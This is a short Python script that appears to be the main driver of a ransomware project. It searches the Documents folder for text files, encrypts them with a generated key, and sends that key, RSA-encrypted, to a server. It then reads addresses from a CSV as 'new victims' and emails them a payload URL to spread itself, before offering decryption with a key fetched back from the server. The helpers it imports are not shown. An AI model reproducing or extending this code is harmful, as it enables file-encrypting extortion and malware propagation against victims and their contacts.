from utils import waitingForKey, generate_key, get_ascii_key_from_server, findTxtFileInDocumentsAndSaveThemTo, encrypt_ascii_key_with_server_RSA_and_send_to_server, encrypt_file_paths, saveKey, decrypt_file_paths, get_emails_from_csv, send_to_emails

# 1
ascii_key = generate_key(16)
print("ascii_key:\n" + ascii_key)

#2
file_contains_paths ="paths.txt"
findTxtFileInDocumentsAndSaveThemTo( file_contains_paths )

#3
encoded_encrypted_msg,exported_public_key, credentials, payload_url = encrypt_ascii_key_with_server_RSA_and_send_to_server(ascii_key)
saveKey(exported_public_key.decode(), "keyPair.key")
#4
encrypt_file_paths(ascii_key, file_contains_paths)

#5
saveKey(ascii_key, "Key.key")

#6
saveKey(encoded_encrypted_msg.decode(), "encryptedKey.key")

#7
emails = get_emails_from_csv()
print("New victims emails :", emails)

#8
send_to_emails(emails, credentials, payload_url)
print("Payload URL:", payload_url)
print("Payload was sent successfully!")

#9
input("Press enter to decrypt files:")

ascii_key =  get_ascii_key_from_server()

decrypt_file_paths(ascii_key, file_contains_paths)

input("Press Enter To Close...")